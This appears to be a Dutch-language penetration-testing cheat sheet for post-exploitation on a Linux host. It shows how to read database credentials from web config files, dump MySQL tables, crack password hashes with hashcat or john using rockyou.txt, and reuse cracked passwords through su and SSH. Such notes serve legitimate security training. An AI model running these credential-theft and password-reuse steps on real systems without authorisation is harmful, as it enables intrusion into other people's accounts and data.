## Mysql

### Overzicht

Eenmaal binnen gekomen in een linux omgeving, bekijken we of er iets te vinden valt over mysql.

#### Stappenplan

##### 1. Webapplicatie?

*Heeft de server een draaiende webapplicatie met een cms of statische pagina en maakt hij gebruik van een database door functies zoals registreren en/of login?*

**Ja:**

```
cd /var/www/html
```

*Zoek naar database config file in talen zoals: php, xml, yml & conf*

```
cat database.file
```

**Sla creds op in een txt file**

##### 2. Mysql toegang

```
mysql -u <dbfile-username> -p
Password: <dbfile-password>
show databases;
use <dbname>;
show tables;
select * from <tablename>;
```

##### 3. john / hashcat voor wachtwoord

*Wachtwoord van gebruiker gevonden, maar gehashed?*

```
sudo su
mkdir www
echo "<hash>" > hash.txt
```

*Indien welke beter werkt*

```
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```
of
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --show
```

##### 4. toegang verkrijgen

**Shell Access**

*Mocht je leesrechten hebben: /etc/passwd*

```
users:group:blabla
```

Check of database username in deze file zit en doe:

```
su <username>
password: <crackedpassword>
```

**SSH**

```
ssh <username>@<domain>
password: crackedpassword
```

